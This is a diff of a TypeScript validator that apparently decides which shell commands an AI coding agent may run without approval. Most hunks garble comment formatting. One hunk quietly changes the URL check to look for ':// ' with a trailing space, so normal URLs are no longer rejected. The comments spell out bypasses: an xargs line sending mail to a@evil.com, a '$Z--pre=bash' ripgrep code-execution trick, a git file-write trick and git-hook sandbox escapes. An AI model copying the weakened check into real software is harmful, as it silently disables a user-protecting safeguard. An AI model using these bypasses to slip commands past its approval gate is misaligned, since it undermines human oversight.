@@ -133,19 +133,16 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
       // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
       // flag takes NO arg and `X` becomes the next positional (target command).
-      //
-      // `-i` (`i::` — optional replace-str):
-      //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
-      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
-      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
-      //
-      // `-e` (`e::` — optional eof-str):
-      //   cat data | xargs -e EOF echo foo
-      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
-      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
-      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
-      //
-      // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
+      // // `-i` (`i::` — optional replace-str):
+      // echo /usr/sbin/sendm | xargs -it tail a@evil.com
+      // validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
+      // GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
+      // // `-e` (`e::` — optional eof-str):
+      // cat data | xargs -e EOF echo foo
+      // validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
+      // GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
+      // → executes binary named EOF from PATH → CODE EXEC (malicious repo)
+      // // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
       // arg) instead — both validator and xargs agree on argument consumption.
       // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
       '-n': 'number',
@@ -1214,7 +1211,7 @@ function getCommandAllowlist(): Record<string, CommandConfig> {
   return allowlist
 }
 
-/**
+/*    *
  * Commands that are safe to use as xargs targets for auto-approval.
  *
  * SECURITY: Only add a command to this list if it has NO flags that can:
@@ -1228,7 +1225,7 @@ function getCommandAllowlist(): Record<string, CommandConfig> {
  * must not have ANY dangerous flags, not just a safe subset.
  *
  * Each command was verified by checking its man page for dangerous capabilities.
- */
+     */
 const SAFE_TARGET_COMMANDS_FOR_XARGS = [
   'echo', // Output only, no dangerous flags
   'printf', // xargs runs /usr/bin/printf (binary), not bash builtin — no -v support
@@ -1238,11 +1235,11 @@ const SAFE_TARGET_COMMANDS_FOR_XARGS = [
   'tail', // Read-only (including -f follow), no dangerous flags
 ]
 
-/**
+/*    *
  * Unified command validation function that replaces individual validator functions.
  * Uses declarative configuration from COMMAND_ALLOWLIST to validate commands and their flags.
  * Handles combined flags, argument validation, and shell quoting bypass detection.
- */
+     */
 export function isCommandSafeViaFlagParsing(command: string): boolean {
   // Parse the command to get individual tokens using shell-quote for accuracy
   // Handle glob operators by converting them to strings, they don't matter from the perspective
@@ -1310,7 +1307,7 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
       const token = tokens[i]
       if (token && !token.startsWith('-')) {
         // Reject HTTP/HTTPS URLs
-        if (token.includes('://')) {
+        if (token.includes(':// ')) {
           return false
         }
         // Reject SSH URLs like git@github.com:user/repo.git
@@ -1329,23 +1326,19 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   // `env => \`$${env}\`` callback at line 825 preserves `$VAR` as LITERAL TEXT
   // in tokens, but bash expands it at runtime (unset vars → empty string).
   // This parser differential defeats BOTH validateFlags and callbacks:
-  //
-  //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
-  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
-  //       (starts with `$`) falls through as positional at ~:1730. Bash runs
-  //       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
-  //
-  //   (2) `$VAR`-prefix → RCE via `rg --pre`:
-  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
-  //       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
-  //
-  //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
-  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
-  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
-  //       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
-  //       tokens would NOT close this.
-  //
-  // We check ALL tokens after the command prefix. Any `$` means we cannot
+  // //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
+  // `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
+  // (starts with `$`) falls through as positional at ~:1730. Bash runs
+  // `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
+  // //   (2) `$VAR`-prefix → RCE via `rg --pre`:
+  // `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
+  // no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
+  // //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
+  // `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
+  // `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
+  // `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
+  // tokens would NOT close this.
+  // // We check ALL tokens after the command prefix. Any `$` means we cannot
   // determine the runtime token value, so we cannot verify read-only safety.
   // This check must run BEFORE validateFlags and BEFORE callbacks.
   for (let i = commandTokens; i < tokens.length; i++) {
@@ -1407,7 +1400,7 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   return true
 }
 
-/**
+/*    *
  * Creates a regex pattern that matches safe invocations of a command.
  *
  * The regex ensures commands are invoked safely by blocking:
@@ -1418,7 +1411,7 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
  *
  * @param command The command name (e.g., 'date', 'npm list', 'ip addr')
  * @returns RegExp that matches safe invocations of the command
- */
+     */
 function makeRegexForSafeCommand(command: string): RegExp {
   // Create regex pattern: /^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
   return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
@@ -1569,7 +1562,7 @@ const READONLY_COMMAND_REGEXES = new Set([
   /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
 ])
 
-/**
+/*    *
  * Checks if a command contains glob characters (?, *, [, ]) or expandable `$`
  * variables OUTSIDE the quote contexts where bash would treat them as literal.
  * These could expand to bypass our regex-based security checks.
@@ -1596,7 +1589,7 @@ const READONLY_COMMAND_REGEXES = new Set([
  *
  * @param command The command string to check
  * @returns true if the command contains unquoted glob or expandable `$`
- */
+     */
 function containsUnquotedExpansion(command: string): boolean {
   // Track quote state to avoid false positives for patterns inside quoted strings
   let inSingleQuote = false
@@ -1668,13 +1661,13 @@ function containsUnquotedExpansion(command: string): boolean {
   return false
 }
 
-/**
+/*    *
  * Checks if a single command string is read-only based on READONLY_COMMAND_REGEXES.
  * Internal helper function that validates individual commands.
  *
  * @param command The command string to check
  * @returns true if the command is read-only
- */
+     */
 function isCommandReadOnly(command: string): boolean {
   // Handle common stderr-to-stdout redirection pattern
   // This handles both "command 2>&1" at the end of a full command
@@ -1694,10 +1687,8 @@ function isCommandReadOnly(command: string): boolean {
   // Check for unquoted glob characters and expandable `$` variables that could
   // bypass our regex-based security checks. We can't know what these expand to
   // at runtime, so we can't verify the command is read-only.
-  //
-  // Globs: `python *` could expand to `python --help` if such a file exists.
-  //
-  // Variables: `uniq --skip-chars=0$_` — bash expands `$_` at runtime to the
+  // // Globs: `python *` could expand to `python --help` if such a file exists.
+  // // Variables: `uniq --skip-chars=0$_` — bash expands `$_` at runtime to the
   // last arg of the previous command. With IFS word splitting, this smuggles
   // positional args past "flags-only" regexes like uniq's `\S+`. The `$` token
   // check inside isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
@@ -1751,23 +1742,23 @@ function isCommandReadOnly(command: string): boolean {
   return false
 }
 
-/**
+/*    *
  * Checks if a compound command contains any git command.
  *
  * @param command The full command string to check
  * @returns true if any subcommand is a git command
- */
+     */
 function commandHasAnyGit(command: string): boolean {
   return splitCommand_DEPRECATED(command).some(subcmd =>
     isNormalizedGitCommand(subcmd.trim()),
   )
 }
 
-/**
+/*    *
  * Git-internal path patterns that can be exploited for sandbox escape.
  * If a command creates these files and then runs git, the git command
  * could execute malicious hooks from the created files.
- */
+     */
 const GIT_INTERNAL_PATTERNS = [
   /^HEAD$/,
   /^objects(?:\/|$)/,
@@ -1775,23 +1766,23 @@ const GIT_INTERNAL_PATTERNS = [
   /^hooks(?:\/|$)/,
 ]
 
-/**
+/*    *
  * Checks if a path is a git-internal path (HEAD, objects/, refs/, hooks/).
- */
+     */
 function isGitInternalPath(path: string): boolean {
   // Normalize path by removing leading ./ or /
-  const normalized = path.replace(/^\.?\//, '')
+  const normalized = path.replace(/^\.?\// , '')
   return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
 }
 
 // Commands that only delete or modify in-place (don't create new files at new paths)
 const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])
 
-/**
+/*    *
  * Extracts write paths from a subcommand using PATH_EXTRACTORS.
  * Only returns paths for commands that can create new files/directories
  * (write/create operations excluding deletion and in-place modification).
- */
+     */
 function extractWritePathsFromSubcommand(subcommand: string): string[] {
   const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
   if (!parseResult.success) return []
@@ -1822,7 +1813,7 @@ function extractWritePathsFromSubcommand(subcommand: string): string[] {
   return extractor(tokens.slice(1))
 }
 
-/**
+/*    *
  * Checks if a compound command writes to any git-internal paths.
  * This is used to detect potential sandbox escape attacks where a command
  * creates git-internal files (HEAD, objects/, refs/, hooks/) and then runs git.
@@ -1836,7 +1827,7 @@ function extractWritePathsFromSubcommand(subcommand: string): string[] {
  *
  * @param command The full command string to check
  * @returns true if any subcommand writes to git-internal paths
- */
+     */
 function commandWritesToGitInternalPaths(command: string): boolean {
   const subcommands = splitCommand_DEPRECATED(command)
 
@@ -1863,7 +1854,7 @@ function commandWritesToGitInternalPaths(command: string): boolean {
   return false
 }
 
-/**
+/*    *
  * Checks read-only constraints for bash commands.
  * This is the single exported function that validates whether a command is read-only.
  * It handles compound commands, sandbox mode, and safety checks.
@@ -1872,7 +1863,7 @@ function commandWritesToGitInternalPaths(command: string): boolean {
  * @param compoundCommandHasCd Pre-computed flag indicating if any cd command exists in the compound command.
  *                              This is computed by commandHasAnyCd() and passed in to avoid duplicate computation.
  * @returns PermissionResult indicating whether the command is read-only
- */
+     */
 export function checkReadOnlyConstraints(
   input: z.infer<typeof BashTool.inputSchema>,
   compoundCommandHasCd: boolean,
